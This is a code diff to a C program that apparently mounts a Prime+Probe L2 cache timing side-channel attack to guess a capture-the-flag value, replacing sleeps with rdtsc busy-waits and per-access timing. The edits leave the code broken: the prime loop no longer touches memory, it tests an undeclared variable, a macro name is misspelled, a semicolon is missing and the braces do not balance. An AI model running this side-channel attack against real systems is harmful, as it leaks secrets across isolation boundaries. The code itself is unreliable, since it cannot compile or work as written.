@@ -11,7 +11,7 @@
 #define LINE_SIZE 64
 #define STRIDE (NUM_L2_CACHE_SETS * LINE_SIZE)
 
-#define REPEATS 6000
+#define REPEATS 1000
 
 volatile uint8_t *buf;
 volatile uint8_t *eviction_sets[NUM_L2_CACHE_SETS][WAYS];
@@ -22,6 +22,11 @@ static inline uint64_t rdtsc() {
     asm volatile("rdtsc" : "=a"(lo), "=d"(hi));
     asm volatile("mfence");
     return ((uint64_t)hi << 32) | lo;
+}
+
+static inline void wait_cycles(uint64_t cycles) {
+    uint64_t start = rdtsc();
+    while (rdtsc() - start < cycles);
 }
 
 int main() {
@@ -55,15 +60,14 @@ int main() {
         uint64_t scores[NUM_L2_CACHE_SETS] = {0};
 
         for(int r = 0; r < REPEATS; r++) {
-
+            int perm[NUM_L2_CATCHE_SETS]
+            shuffle(perm);
             /* PRIME */
-            for(int set = 0; set < NUM_L2_CACHE_SETS; set++) {
-                for(int w = 0; w < WAYS; w++) {
-                    tmp ^= *eviction_sets[set][w];
-                }
+            for(int i = 0; set < NUM_L2_CACHE_SETS; i++) {
+                int set = perm[i];
             }
 
-            usleep(500);
+            wait_cycles(2000);
 
             /* PROBE */
             for(int set = 0; set < NUM_L2_CACHE_SETS; set++) {
@@ -71,13 +75,13 @@ int main() {
                 uint64_t start = rdtsc();
 
                 for(int w = WAYS-1; w >= 0; w--) {
+
+                    uint64_t start = rdtsc();
                     tmp ^= *eviction_sets[set][w];
+                    uint64_t end = rdtsc();
+
+                    scores[set] += (end - start);
                 }
-
-                uint64_t end = rdtsc();
-
-                scores[set] += (end - start);
-            }
         }
 
         /* Combine alias groups */
@@ -115,7 +119,7 @@ int main() {
 
         printf("Guessed flag: %d (latency=%lu)\n", best_set, best_latency);
 
-        usleep(500000);
+        wait_cycles(2000);
     }
 
     return 0;
